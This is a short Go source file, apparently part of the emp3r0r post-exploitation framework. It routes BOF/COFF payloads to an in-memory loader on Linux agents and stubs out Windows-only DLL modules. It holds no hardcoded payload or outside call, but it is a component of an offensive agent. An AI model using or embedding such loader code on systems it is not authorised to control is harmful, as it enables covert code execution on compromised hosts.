//go:build linux

package modules

import (
	"fmt"

	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/coffloader"
)

// runCOFFModule executes a BOF payload on Linux.
func runCOFFModule(payload []byte, invocation def.ResolvedInvocation, token uintptr) (out string, err error) {
	defer func() {
		if r := recover(); r != nil {
			err = fmt.Errorf("runCOFFModule panic: %v", r)
			out = ""
		}
	}()

	if invocation.Coff == nil {
		return "", fmt.Errorf("missing COFF invocation data")
	}

	args := make([]coffloader.CoffArg, 0, len(invocation.Coff.Args))
	for _, a := range invocation.Coff.Args {
		args = append(args, coffloader.CoffArg{WireType: a.WireType, Value: a.Value})
	}

	return coffloader.RunLinuxCOFF(payload, invocation.Coff.Export, args, token)
}

// runDLLModule is Windows-only; DLL modules are not supported on Linux agents.
func runDLLModule(_ []byte, _ def.ResolvedInvocation, _ uintptr) (string, error) {
	return "", fmt.Errorf("DLL modules are only supported on Windows agents")
}
